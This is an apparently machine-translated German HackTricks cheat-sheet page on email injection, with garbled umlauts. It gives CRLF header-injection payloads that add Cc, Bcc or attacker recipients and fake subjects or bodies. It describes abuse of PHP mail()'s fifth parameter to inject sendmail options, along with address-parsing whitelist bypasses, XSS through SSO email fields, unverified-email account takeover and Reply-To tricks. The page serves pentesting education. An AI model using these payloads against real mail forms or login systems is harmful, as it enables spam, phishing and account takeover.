# Email Injections

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## In E-Mail einf√ºgen

### Cc und Bcc nach dem Absender-Argument einf√ºgen
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
Die Nachricht wird an die Konten des Empf√§ngers und des Empf√§ngers1 gesendet.

### Inject argument
```
From:sender@domain.com%0ATo:attacker@domain.com
```
Die Nachricht wird an den urspr√ºnglichen Empf√§nger und das Angreifer-Konto gesendet.

### Inject Subject argument
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
Der gef√§lschte Betreff wird dem urspr√ºnglichen Betreff hinzugef√ºgt und ersetzt in einigen F√§llen diesen. Es h√§ngt vom Verhalten des E-Mail-Dienstes ab.

### √Ñndern Sie den Text der Nachricht

Injizieren Sie einen Zeilenumbruch, und schreiben Sie dann Ihre Nachricht, um den Text der Nachricht zu √§ndern.
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() Funktion Ausnutzung
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### Der 5. Parameter ($additional\_parameters)

Dieser Abschnitt basiert auf **wie man diesen Parameter missbrauchen kann, vorausgesetzt, ein Angreifer kontrolliert ihn**.

Dieser Parameter wird zur Befehlszeile hinzugef√ºgt, die PHP verwenden wird, um das Binary sendmail aufzurufen. Er wird jedoch mit der Funktion `escapeshellcmd($additional_parameters)` bereinigt.

Ein Angreifer kann in diesem Fall **zus√§tzliche Parameter f√ºr sendmail injizieren**.

#### Unterschiede in der Implementierung von /usr/sbin/sendmail

Die **sendmail**-Schnittstelle wird von der MTA-E-Mail-Software (Sendmail, Postfix, Exim usw.) bereitgestellt, die auf dem System installiert ist. Obwohl die **grundlegende Funktionalit√§t** (wie -t -i -f Parameter) aus Kompatibilit√§tsgr√ºnden **gleich bleibt**, variieren **andere Funktionen und Parameter** stark, abh√§ngig vom installierten MTA.

Hier sind einige Beispiele f√ºr verschiedene Man-Seiten des sendmail-Befehls/-schnittstelle:

* Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
* Postfix MTA: http://www.postfix.org/mailq.1.html
* Exim MTA: https://linux.die.net/man/8/eximReferences

Je nach **Herkunft des sendmail**-Binaries wurden verschiedene Optionen entdeckt, um sie auszunutzen und **Dateien zu leaken oder sogar beliebige Befehle auszuf√ºhren**. √úberpr√ºfen Sie, wie in [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## In den E-Mail-Namen injizieren

### Ignorierte Teile einer E-Mail

Die Symbole: **+, -** und **{}** k√∂nnen in seltenen F√§llen zum Taggen verwendet werden und werden von den meisten E-Mail-Servern ignoriert.

* Z.B. john.doe+intigriti@example.com ‚Üí john.doe@example.com

**Kommentare in Klammern ()** am Anfang oder Ende werden ebenfalls ignoriert.

* Z.B. john.doe(intigriti)@example.com ‚Üí john.doe@example.com

### Whitelist-Umgehung

<figure><img src="../.gitbook/assets/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### Anf√ºhrungszeichen

<figure><img src="../.gitbook/assets/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IPs

Sie k√∂nnen auch IPs als Domainnamen in eckigen Klammern verwenden:

* john.doe@\[127.0.0.1]
* john.doe@\[IPv6:2001:db8::1]

### Andere Schwachstellen

![https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](<../.gitbook/assets/image (1131).png>)

## Drittanbieter-SSO

### XSS

Einige Dienste wie **github** oder **salesforce erlauben** es Ihnen, eine **E-Mail-Adresse mit XSS-Payloads zu erstellen**. Wenn Sie **diese Anbieter verwenden k√∂nnen, um sich bei anderen Diensten anzumelden** und diese Dienste **die E-Mail nicht korrekt bereinigen**, k√∂nnten Sie **XSS** verursachen.

### Konto√ºbernahme

Wenn ein **SSO-Dienst** es Ihnen erlaubt, **ein Konto zu erstellen, ohne die angegebene E-Mail-Adresse zu verifizieren** (wie **salesforce**) und Sie dann dieses Konto verwenden k√∂nnen, um sich bei einem anderen Dienst anzumelden, der **salesforce vertraut**, k√∂nnten Sie auf jedes Konto zugreifen.\
_Beachten Sie, dass salesforce angibt, ob die angegebene E-Mail verifiziert wurde oder nicht, aber die Anwendung sollte diese Informationen ber√ºcksichtigen._

## Antwort-An

Sie k√∂nnen eine E-Mail senden, die _**Von: company.com**_ und _**Antwort-An: attacker.com**_ verwendet, und wenn eine **automatische Antwort** gesendet wird, weil die E-Mail **von** einer **internen Adresse** gesendet wurde, k√∂nnte der **Angreifer** in der Lage sein, diese **Antwort** zu **erhalten**.

## Hard Bounce Rate

Bestimmte Dienste, wie AWS, implementieren einen Schwellenwert, der als **Hard Bounce Rate** bekannt ist, typischerweise auf 10% festgelegt. Dies ist eine kritische Kennzahl, insbesondere f√ºr E-Mail-Zustelldienste. Wenn dieser Wert √ºberschritten wird, kann der Dienst, wie der E-Mail-Dienst von AWS, ausgesetzt oder blockiert werden.

Ein **hard bounce** bezieht sich auf eine **E-Mail**, die an den Absender zur√ºckgesendet wurde, weil die Adresse des Empf√§ngers ung√ºltig oder nicht existent ist. Dies kann aus verschiedenen Gr√ºnden geschehen, wie z.B. dass die **E-Mail** an eine nicht existierende Adresse gesendet wurde, eine Domain, die nicht real ist, oder die Ablehnung des Empf√§ngerservers, **E-Mails** zu akzeptieren.

Im Kontext von AWS, wenn Sie 1000 E-Mails senden und 100 davon zu Hard Bounces f√ºhren (aufgrund von Gr√ºnden wie ung√ºltigen Adressen oder Domains), w√ºrde dies eine Hard Bounce Rate von 10% bedeuten. Das Erreichen oder √úberschreiten dieses Wertes kann dazu f√ºhren, dass AWS SES (Simple Email Service) Ihre E-Mail-Sendefunktionen blockiert oder aussetzt.

Es ist entscheidend, eine niedrige Hard Bounce Rate aufrechtzuerhalten, um einen ununterbrochenen E-Mail-Dienst sicherzustellen und den Absenderruf zu wahren. Die √úberwachung und Verwaltung der Qualit√§t der E-Mail-Adressen in Ihren Mailinglisten kann erheblich dazu beitragen, dies zu erreichen.

F√ºr detailliertere Informationen kann auf die offizielle Dokumentation von AWS zur Handhabung von Bounces und Beschwerden verwiesen werden: [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types).

## Referenzen

* [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
* [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
* [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
* [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0)

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=email-injections), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=email-injections" %}
